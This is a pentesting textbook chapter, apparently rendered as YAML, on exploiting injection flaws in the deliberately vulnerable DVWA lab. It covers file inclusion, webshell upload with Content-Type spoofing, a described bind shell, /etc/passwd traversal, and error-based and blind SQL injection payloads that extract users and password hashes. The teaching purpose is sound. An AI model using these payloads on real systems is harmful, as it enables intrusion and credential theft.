- en: Exploiting Injection Vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this chapter we will cover the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Looking for file inclusions
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Abusing file inclusions and uploads
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Manually identifying SQL injection
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Step-by-step error-based SQL injection
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Identifying and exploiting blind SQL injections
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Finding and exploiting SQL injections with SQLMap
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Exploiting an XML External Entity injection
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Detecting and exploiting command injection vulnerabilities
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Introduction
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: According to the OWASP Top 10 2017 list ([https://www.owasp.org/index.php/Top_10-2017_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10)),
    injection flaws, such as SQL, operating system commands, and XML injection, are
    the most prevalent vulnerabilities and have the highest impact of all web application
    vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: Injection flaws occur when untrusted data coming from user-provided parameters
    is to be interpreted by the server. An attacker can then trick the interpreter
    into treating this data as executable instructions, making it execute unintended
    commands or gaining access to data without proper authorization.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we will discuss the major injection flaws in today's web applications,
    and will also look at tools and techniques to use in order to detect and exploit
    them.
  prefs: []
  type: TYPE_NORMAL
- en: Looking for file inclusions
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: File inclusion vulnerabilities occur when developers use request parameters,
    which can be modified by users, to dynamically choose which pages to load or to
    include in the code the server will execute. Such vulnerabilities may cause a
    full system compromise if the server executes the included file.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will test a web application to discover whether it is vulnerable
    to file inclusions.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We will use **Damn Vulnerable Web Application** (**DVWA**) for this recipe,
    so we need both the Kali and vulnerable virtual machines. Let''s take a look at
    the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: Log into DVWA and go to File Inclusion.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'It says that we should edit the `GET` parameter `page` to test the inclusion,
    so let''s try with `index.php`. The result is shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/4a8bf4f1-c4d0-42b9-912d-abc94d3e9aa4.png)'
  prefs: []
  type: TYPE_IMG
- en: It seems that there is no `index.php` file in that directory (or it is empty).
    Maybe this means that **Local File Inclusion** (**LFI**) is possible.
  prefs: []
  type: TYPE_NORMAL
- en: 'To try LFI, we need to know the name of a file that really exists locally.
    We know that there is an `index.php` in the root directory of DVWA, so we try
    directory traversal together with file inclusion. Set `../../index.php` to the
    page variable, and we get the following:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/7e577f84-4349-457b-999c-7256289f7465.png)'
  prefs: []
  type: TYPE_IMG
- en: With this, we have demonstrated that LFI and directory traversal are both possible
    (by using `*../../*`, we traverse the directory tree).
  prefs: []
  type: TYPE_NORMAL
- en: 'The next step is to try **Remote File Inclusion** (**RFI**), which is including
    a file hosted in another server instead of a local file. As our vulnerable virtual
    machine does not have internet access (or it should not have, for security reasons),
    we will try and include a file hosted in our Kali machine. Open a Terminal in
    Kali and start the Apache service:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'Now, in the browser, let''s include our Kali home page by entering the URL
    of the page as a parameter on the vulnerable application, `http://192.168.56.11/dvwa/vulnerabilities/fi/?page=http://192.168.56.10/index.html`,
    as shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/9d55db72-042c-46f2-bfca-49d3f8bdca98.png)'
  prefs: []
  type: TYPE_IMG
- en: We were able to make the application load an external page by entering its full
    URL in the parameter. This means it is vulnerable to RFI. If the included file
    contains executable server-side code (PHP, for example), such code will be executed
    by the server, allowing an attacker to remotely execute commands, which makes
    a full system compromise very likely.
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'If we use the View Source button in DVWA, we can see the server-side source
    code is as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: This means the `page` variable's value is passed directly to the filename, and
    then it is included in the code. With this, we can include and execute any PHP
    or HTML file we want in the server, as long as it is accessible through the network.
    To be vulnerable to RFI, the server must include `allow_url_fopen` and `allow_url_include`
    in its configuration. Otherwise, it will only be LFI, if the file inclusion vulnerability
    is present.
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We can also use LFI to display relevant files in the host operating system.
    Try, for example including `../../../../../../etc/passwd`, and you will get a
    list of system users, their home directories, and their default shells.
  prefs: []
  type: TYPE_NORMAL
- en: Abusing file inclusions and uploads
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As we saw in the previous recipe, file inclusion vulnerabilities occur when
    developers use poorly validated input to generate file paths and use those paths
    to include source code files. Modern versions of server-side languages, such as
    PHP since 5.2.0, have disabled the ability to include remote files by default,
    so it has been less common to find an RFI since 2011.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will first upload a malicious file, namely a `webshell` (a
    web page capable of executing system commands in the server), and execute it using
    LFI.
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we will upload a file to the server. We need to know where is
    it going to be stored in order to be able to access it via programming. To get
    the upload location, go to Upload in DVWA and upload any JPG image. If the upload
    is successful, it will display the path to which it was uploaded (`../../hackable/uploads/`).
    Now we know the relative path where the application saves the uploaded files;
    that's enough for this recipe.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now create a file called `webshell.php` with the following content:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: Notice how the `action` parameter includes the upload path we got from uploading
    the JPG file.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Let''s raise the bar a little bit by adding some protections to the vulnerable
    page: log into DVWA, go to DVWA Security, and set the security level to Medium.
    Now we can start testing:'
  prefs: []
  type: TYPE_NORMAL
- en: 'First, let''s try to upload our file. In DVWA, go to Upload and try to upload
    `webshell.php`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/d18a5299-4709-421e-b6eb-597ca25450f5.png)'
  prefs: []
  type: TYPE_IMG
- en: So, there is a validation of what we can upload, and the file needs to be an
    image; we will need to bypass this protection in order to upload our `webshell`.
  prefs: []
  type: TYPE_NORMAL
- en: An easy way to avoid the validation is to rename our PHP file with a valid extension.
    But this would cause the server and browser to treat it like an image, and the
    code wouldn't execute. Instead, we will work around this protection by modifying
    the request's parameters.  Set up Burp Suite as an intercepting proxy.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Select the `webshell.php` file for uploading.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Enable interception in Burp Suite and click Upload. The intercepted request
    is shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/09c073dd-521d-4325-9cff-2a83927ccfea.png)'
  prefs: []
  type: TYPE_IMG
- en: You can see that the request is `multipart`. This means it has multiple, separate
    components, each one with its header section. Notice the `Content-Type` header
    in the second part, the one with the content of the file we are trying to upload.
    It says `application/x-php`, which tells the server the file is a PHP script.
  prefs: []
  type: TYPE_NORMAL
- en: 'Change the value of `Content-Type` in the second part to `image/jpeg` and submit
    the request. As shown in the following screenshot, this will be successful:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/c5995b40-6884-4940-9abf-3aac631285b7.png)'
  prefs: []
  type: TYPE_IMG
- en: The next step is to use this `webshell` to execute system commands on the server.
    Go back to File Inclusion in DVWA.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'As we did in the previous recipe, use the `page` parameter to include our `webshell`.
    Remember to use the relative path (`../../hackable/uploads/webshell.php`), as
    shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/a568db98-c14b-4bf1-9231-7a629b637b8e.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The page `webshell` code is loaded and we can see the Type a command text and
    a text box below it. In the text box, write `/sbin/ifconfig` and hit *Enter*:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/46626564-7295-466d-9152-fbfd83cecb40.png)'
  prefs: []
  type: TYPE_IMG
- en: And it worked! As we can see in the screenshot, the server has the IP address
    `192.168.56.11`. Now we can execute commands in the server by typing them in the
    textbox or setting a different value to the `cmd` parameter.
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'First, we discovered that the application verifies the files before accepting
    the upload. There are multiple ways for an application to do this. The most simple
    and common ways are to check the file extension and the request''s `Content-Type`
    header; the latter is used in this recipe. To bypass this protection, we changed
    the content type of the file, which is set by default by the browser to `application/x-php`,
    to the type that the server expects so that it will accept the file as an image:
    `image/jpeg`.'
  prefs: []
  type: TYPE_NORMAL
- en: 'For more information about valid types in HTTP communication, check out the
    following URLs: [https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types),
    and [https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types).'
  prefs: []
  type: TYPE_NORMAL
- en: The file we uploaded, `webshell.php`, takes a `GET` parameter (`cmd`) and sets
    it as an input parameter to the `system()` function of PHP. What `system` does
    is invoke a system command and display its output in the response to the client.
    The rest of the code is just an HTML form that allows us to input commands over
    and over again. Notice how the action of the form is set to the relative path
    where the file was uploaded. It is done in this way because the file is not being
    called directly, but included. This means its code is interpreted as part of its
    includer's code, hence, all the relative paths and URLs are interpreted from the
    perspective of the file doing the inclusion.
  prefs: []
  type: TYPE_NORMAL
- en: Once the file is uploaded, we used an LFI vulnerability to execute it and run
    system commands on the server.
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Once we are able to upload and execute server-side code, there are a huge number
    of options we can use to compromise the server. For example, in a bind shell,
    we establish a direct connection that allows us to interact directly with the
    server without needing to go through the `webshell`. A very simple way to do this
    is to run the following in the server:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'It will open the TCP port `12345` and listen for a connection. When the connection
    succeeds, it will execute `/bin/bash`, receive its input, and send its output
    through the network to the connected host (the attacking machine). To connect
    to the victim server, let''s say `192.168.56.10`, we run this command in our Kali
    machine:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: This connects to the server listening on port `12345`. It is also possible to
    make the server download a malicious program, a privilege escalation exploit,
    for example, and execute it to become a user with more privileges.
  prefs: []
  type: TYPE_NORMAL
- en: Manually identifying SQL injection
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Most modern web applications implement some kind of database, and SQL is the
    most popular language to make queries to databases. In an **SQL injection** (**SQLi**)
    attack, the attacker seeks to abuse the communication between an application and
    a database by making the application send altered queries via the injection of
    SQL commands in form inputs or any other parameter in requests that are used to
    build an SQL statement in the server.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will test the inputs of a web application to see whether
    it is vulnerable to error-based SQLi.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Log into DVWA, go to SQL Injection, and check that the security level is low:'
  prefs: []
  type: TYPE_NORMAL
- en: As in previous recipes, let's test the normal behavior of the application by
    introducing a number. Set User ID as `1` and click Submit. By looking at the result,
    we can say that the application queried a database to see whether there is a user
    with an ID equal to one and returned the ID, name, and surname of that user.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Next, we must test what happens if we send something that the application does
    not expect. Introduce `1''` in the textbox and submit that ID. As shown in the
    following screenshot, the application should respond with an error:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/0c910232-1b76-4177-927e-5096ce25a9b0.png)'
  prefs: []
  type: TYPE_IMG
- en: This error message tells us that the database received an incorrectly formed
    query. This doesn't mean we can be sure there is an SQLi here, but it is very
    likely that this application is vulnerable.
  prefs: []
  type: TYPE_NORMAL
- en: Return to the DVWA SQL Injection page.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'To be sure that there is an error-based SQLi, we try another input: `1''''`
    (two apostrophes this time):'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/0f949c4e-80be-41ec-ab04-e9ee125af8c2.png)'
  prefs: []
  type: TYPE_IMG
- en: No error this time. This confirms that there is an SQLi vulnerability in the
    application.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now we will perform a very basic SQLi attack. Introduce `''` or `''1''=''1`
    in the textbox and submit. The result should look something like the following:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/63830257-82a1-489b-a186-62149e73dbfa.png)'
  prefs: []
  type: TYPE_IMG
- en: It looks like we just got all the users registered on the database.
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'SQLi occurs when the input is not validated and sanitized before it is used
    to form a query for the database. Let''s imagine that the server-side code (in
    PHP) in the application composes the query as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'This means that the data sent in the `id` parameter will be integrated as is
    in the query. If we replace the parameter reference with its value, we have this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'So, when we send a malicious input like we did, the line of code is read by
    the PHP interpreter as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'And the resulting SQL sentence will look like:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: That means select everything from the table called `users` if the user `id`
    equals nothing or `1 = 1`; and since one always equals one, all users are going
    to meet these criteria. The first apostrophe we send closes the one opened in
    the original code. After that, we can introduce some SQL code, and the last one
    without a closing apostrophe uses the one already set in the server's code.
  prefs: []
  type: TYPE_NORMAL
- en: This is called **error-based SQLi**, and is the most basic form of SQLi because
    we use error messages to figure out whether we have formed a valid query with
    our injection, and the results are displayed directly in the application's output.
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: An SQLi attack may cause much more damage than simply showing the usernames
    of an application. By exploiting this kind of vulnerability, an attacker may exfiltrate
    all kinds of sensitive information about users, such as contact details and credit
    card numbers. It is also possible to compromise the whole server, and be able
    to execute commands and escalate privileges in it. Also, an attacker may be able
    to extract all the information from the database, including database and system
    users, passwords, and, depending on the server and internal network configuration,
    an SQLi vulnerability may be an entry point for a full network and internal infrastructure
    compromise.
  prefs: []
  type: TYPE_NORMAL
- en: Step-by-step error-based SQL injections
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the previous recipe, we detected an SQLi. In this recipe, we will exploit
    that vulnerability and use it to extract information from the database.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We already know that DVWA is vulnerable to SQLi, so let''s log in and browse
    to `http://192.168.56.11/dvwa/vulnerabilities/sqli/`. Then, follow the following
    steps:'
  prefs: []
  type: TYPE_NORMAL
- en: After detecting that an SQLi exists, the next step is to get to know the internal
    query, or, more precisely, the number of columns its result has. Enter any number
    in the User ID box and click Submit.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Now, open the HackBar (hit *F9*) and click Load URL. The URL in the address
    bar should now appear in the HackBar.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'In the HackBar, we replace the value of the id parameter with `1'' order by
    1 -- ''` and click Execute, as shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/97f388d1-0802-477a-b9de-f33456618bbc.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We keep increasing the number after `order by` and executing the requests until
    we get an error. In this example, it happens when ordering by column `3`. This
    means that the result of the query has only two columns and an error is triggered
    when we attempt to order it by a non-existent column:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/863fd488-27a9-4d92-9059-57260e3421c6.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now we know the query has two columns. Let''s try to use the `union` statement
    to extract some information. Set the value of `id` to `1'' union select 1,2 --
    ''` and Execute. You should have two results:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/f904a417-4966-4aab-a834-b41595739ec8.png)'
  prefs: []
  type: TYPE_IMG
- en: 'This means we can ask for two values in that union query. Let''s get the version
    of the DBMS and the database user. Set `id` to `1'' union select @@version,current_user()
    -- ''` and Execute:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/a511ea7a-b70e-4cc1-93bd-1d50c8a22ac8.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Let''s look for something more relevant, the users of the application, for
    example. First, we need to locate the users'' table. Set the `id` to `1'' union
    select table_schema, table_name FROM information_schema.tables WHERE table_name
    LIKE ''%user%'' -- ''` and submit to get the following result:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/508635f9-ff6b-4e05-ae39-453e45155d00.png)'
  prefs: []
  type: TYPE_IMG
- en: OK, we know that the database (or schema) is called `dvwa` and the table we
    are looking for is `users`. As we have only two positions to set values, we need
    to know which columns of the table are useful to us; set `id` to `1' union select
    column_name, 1 FROM information_schema.tables WHERE table_name = 'users' -- '`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'And finally, we know exactly what to ask for. Set id to `1'' union select user,
    password FROM dvwa.users -- ''`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/55080009-b796-4844-acf7-72c5798ef9b9.png)'
  prefs: []
  type: TYPE_IMG
- en: In the `First name:` field we have the application's username, and, in the `Surname:` field,
    we have each user's password hash. We can copy those hashes to a text file and
    try to crack them with John the Ripper, or our favorite password cracker.
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: From our first injection, `1' order by 1 -- '` through `1' order by 3 -- '`,
    we are using a feature in SQL that allows us to order the results of a query by
    a certain field or column using its number in the order it is declared in the
    query. We used this to generate an error so that we could find out how many columns
    the query has, and so that we can use them to create a `union` query.
  prefs: []
  type: TYPE_NORMAL
- en: 'The `union` statement is used to concatenate two queries that have the same
    number of columns. By injecting this, we are able to query almost anything to
    the database. In this recipe, we first checked whether it was working as expected.
    After that, we set our objective in the users'' table and did the following to
    get it:'
  prefs: []
  type: TYPE_NORMAL
- en: The first step was to discover the database and table's names. We did this by
    querying the `information_schema` database, which is the one that stores all information
    on databases, tables, and columns in MySQL.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Once we knew the names of the database and table, we queried for the columns
    in the table to find out which ones we were looking for, which turned out to be
    user and password.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: And lastly, we injected a query asking for all usernames and passwords in the
    users table of the `dvwa` database.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Identifying and exploiting blind SQL injections
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We already saw how an SQLi vulnerability works. In this recipe, we will cover
    a different vulnerability of the same kind, one that does not show an error message
    or a hint that could lead us to the exploitation. We will learn how to identify
    and exploit a blind SQLi.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Log into DVWA and go to SQL Injection (Blind):'
  prefs: []
  type: TYPE_NORMAL
- en: The form looks exactly the same as the SQLi form we saw in the previous recipes.
    Type `1` in the textbox and click Submit to see the information about the user
    with the ID `1`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Now, let''s perform our first test with `1''` and see whether we get an error
    as in previous recipes:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/dc57be9c-d1b4-4004-a45f-7374db0143ce.png)'
  prefs: []
  type: TYPE_IMG
- en: We get no error message, but no result either. Something interesting could be
    happening here.
  prefs: []
  type: TYPE_NORMAL
- en: 'We perform our second test with `1''''`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/bab46b64-edc8-4eb3-a2a8-5e6379ab2481.png)'
  prefs: []
  type: TYPE_IMG
- en: The result for ID `1` is shown. This means that the previous test (`1'`) was
    an error that was captured and processed by the application. It's highly probable
    that we have an SQLi here, but it seems to be blind—no information about the database
    is shown, so we will need to guess.
  prefs: []
  type: TYPE_NORMAL
- en: Let's try to identify what happens when you inject some code that is always
    false. Set `1*'*` and `'1'='2` as the user ID. `1` is not equal to `2`, so no
    record meets the selection criteria in the query and no result is given.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Now try a query that will always be true when the ID exists: `1'' and ''1''=''1`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/f6eb8319-c122-472c-b790-b986888ef2cb.png)'
  prefs: []
  type: TYPE_IMG
- en: 'This demonstrates that there is a blind SQLi in this page: if we get different
    responses to an injection of SQL code that always gives a false result, and another
    one that always gives a true result, we have a vulnerability because the server
    is executing the code, even if it doesn''t show it explicitly in the response.'
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will discover the name of the user connecting to the database,
    so we first need to know the length of the username. Let's try one. Inject this:` 1'
    and 1=char_length(current_user()) and '1'='1`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'The next step is to find this last request in Burp Suite''s proxy history and
    send it to the intruder, as shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/d5f5ecf3-1b65-4598-941b-81e0b5432c94.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Once sent to the intruder, we can clear all the payload markers and add one
    in the `1` after the first `and`, as shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/3935dc15-2d47-437f-9375-621a3717fff4.png)'
  prefs: []
  type: TYPE_IMG
- en: Go to the Payload section and set the Payload type to Numbers.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Set the Payload type to Sequential, from `1` to `15` with a step of one. It
    should look like this:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/6139f9de-72c4-4ee3-a6ef-b8b5fab6bad9.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To see whether a response is positive or negative, go to Intruder''s options,
    clear the Grep - Match list, and add `First name`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/b96f5d74-92c6-4e16-a6d9-7049435ac93c.png)'
  prefs: []
  type: TYPE_IMG
- en: We need to make this change in every Intruder tab we use for this attack.
  prefs: []
  type: TYPE_NORMAL
- en: 'Start the attack. The result shows that the user name is six characters long:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/6ee39402-b5ea-4915-afb5-4226ca2c18ae.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, we are going to guess each character in the username, starting by guessing
    the first letter. Submit the following in the application: `1'' and current_user
    LIKE ''a%`. The `%` character is a wildcard in SQL that will match any string.
    We chose `a` as the first letter to get Burp Suite to obtain the request. It could
    have been any letter.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Again, we send the request to the Intruder and leave only one payload marker
    in the `a`, which is the first letter of the name:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/596fb89b-b65a-4f88-ac2e-110416504b93.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Our payloads will be a simple list containing all the lowercase letters (a
    to z), numbers (0 to 9), and some special characters (-, +, #, %, @). Uppercase
    letters are omitted because select queries in MySQL are not case sensitive.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Repeat *step 12* in this Intruder tab and start the attack, as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/bc8240ed-3aa8-42c5-b7fb-60b73912164c.png)'
  prefs: []
  type: TYPE_IMG
- en: The first letter of our user name is `d`.
  prefs: []
  type: TYPE_NORMAL
- en: Now, we need to find the second character of the name, so we submit `1' and
    current_user LIKE 'da%` to the application's textbox and send the request to the
    intruder.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Now, our payload marker will be the `a` following the `d`; in other words, the
    second letter of the name.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Start the attack to discover the second letter. You will see that it''s `v`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/3f1a6566-086c-4180-b8f5-4214197086f5.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Keep discovering all six characters in the username. You may notice that the
    `%` symbol in the payload is always marked as true. This is because, as we said
    previously, this symbol is a wildcard. We need it because it is a valid character
    in usernames. As we can see in the following screenshot, the last character is
    indeed `%`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/0d0ae8c8-102c-4daf-8e1b-fa33c70f17fb.png)'
  prefs: []
  type: TYPE_IMG
- en: According to this result, the user name is `dvwa@%`. The second `%` character
    is part of our injection and matches the empty string after the actual name.
  prefs: []
  type: TYPE_NORMAL
- en: 'To verify the discovered username, we replace the like operator with `=`. Submit `1''
    and current_user()=''dvwa@%` to the page:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/5be57c5d-d423-4aa5-8849-96f4a3ac0a27.png)'
  prefs: []
  type: TYPE_IMG
- en: This confirms that we have found the correct name for the current user.
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Error-based SQLi and blind SQLi are, on the server side, the same vulnerability:
    the application doesn''t sanitize inputs before using them to generate a query
    to the database. The difference between them lies in detection and exploitation.'
  prefs: []
  type: TYPE_NORMAL
- en: In an error-based SQLi, we use the errors sent by the server to identify the
    type of query, tables, and column names.
  prefs: []
  type: TYPE_NORMAL
- en: 'On the other hand, when we try to exploit a blind injection, we need to harvest
    the information by asking questions such as *is there a user whose name starts
    with "a"*?, and then *is there a user whose name starts with "aa"*?*, *or as an
    SQLi: `''and name like ''a%`, so it may take more time to detect and exploit.'
  prefs: []
  type: TYPE_NORMAL
- en: Manually exploiting blind SQLi takes much more effort and time than error-based
    injection; in this recipe, we saw how to obtain the name of the user connected
    to the database, but in the previous recipe, we used a single command to get it.
    We could have used a dictionary approach to see whether the current user was in
    a list of names, but it would take much more time, and the name might not be in
    the list anyway.
  prefs: []
  type: TYPE_NORMAL
- en: Once we knew there was an injection and what a positive response would look
    like, we proceeded to ask for the length of the current username. We asked the
    database *is 1 the length of the current username*?, *is it 2*, and so on, until
    discovering the length. It is useful to know when to stop looking for characters
    in the username.
  prefs: []
  type: TYPE_NORMAL
- en: After finding the length, we use the same technique to discover the first letter.
    The `LIKE 'a%'` statement tells the SQL interpreter whether or not the first letter
    is `a`; the rest doesn't matter, it could be anything (`%` is the wildcard character
    for most SQL implementations). Here, we saw that the first letter was `d`. Using
    the same principle, we found the rest of the characters and worked out the name.
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This attack could continue by finding out the DBMS, the version being used,
    and then using vendor-specific commands to see whether the user has administrative
    privileges. If they do, you would extract all usernames and passwords, activate
    remote connections, and many more things besides. One other thing you could try
    is to use tools to automate this type of attack, such as SQLMap, which we will
    cover in the next recipe.
  prefs: []
  type: TYPE_NORMAL
- en: See also
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: There is another kind of blind injection, which is called **time-based Blind
    SQLi**, in which we don't have a visual clue whether or not the command was executed
    (as in valid or invalid account messages). Instead, we need to send a sleep command
    to the database and, if the response time is slightly longer than the one we sent,
    then it is a true response. This kind of attack is slow as it is sometimes necessary
    to wait even 30 seconds to get just one character. It is very useful to have tools
    such as sqlninja or SQLMap in these situations ([https://www.owasp.org/index.php/Blind_SQL_Injection](https://www.owasp.org/index.php/Blind_SQL_Injection)).
  prefs: []
  type: TYPE_NORMAL
- en: 'Have a look at the following links for more information on Blind SQLi:'
  prefs: []
  type: TYPE_NORMAL
- en: '[https://www.owasp.org/index.php/Blind_SQL_Injection](https://www.owasp.org/index.php/Blind_SQL_Injection)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[https://www.exploit-db.com/papers/13696/](https://www.exploit-db.com/papers/13696/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
